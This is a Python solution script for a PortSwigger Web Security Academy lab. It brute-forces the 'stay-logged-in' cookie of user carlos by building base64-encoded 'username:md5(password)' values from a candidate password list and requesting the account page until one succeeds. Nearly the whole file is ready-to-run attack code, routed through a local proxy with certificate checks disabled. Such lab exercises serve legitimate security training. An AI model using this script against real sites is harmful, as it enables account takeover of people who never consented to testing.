#!/usr/bin/env python3
# Lab: Brute-forcing a stay-logged-in cookie
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
# Difficulty: PRACTITIONER
import base64
import hashlib
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_cookie_value(password):
    md5value = hashlib.md5(password.encode()).hexdigest()
    str = f'carlos:{md5value}'
    b64 = base64.b64encode(str.encode())
    return b64.decode()


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force cookie value')
    client = requests.Session()
    client.verify = False
    client.proxies = proxies
    with open('../candidate_passwords.txt') as f:
        for line in f:
            password = line.strip()
            msg = f'[ ] Try password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)

            cookie_value = get_cookie_value(password)
            client.cookies.set('stay-logged-in', cookie_value, domain=f'{host[8:]}')
            r = client.get(f'{host}/my-account', allow_redirects=False)
            if 'Your username is: carlos' in r.text:
                print()
                print(f'[+] Access of account page of carlos successful')
                sys.exit(0)
    print(f'[-] Brute force of cookie value not successful')


if __name__ == "__main__":
    main()
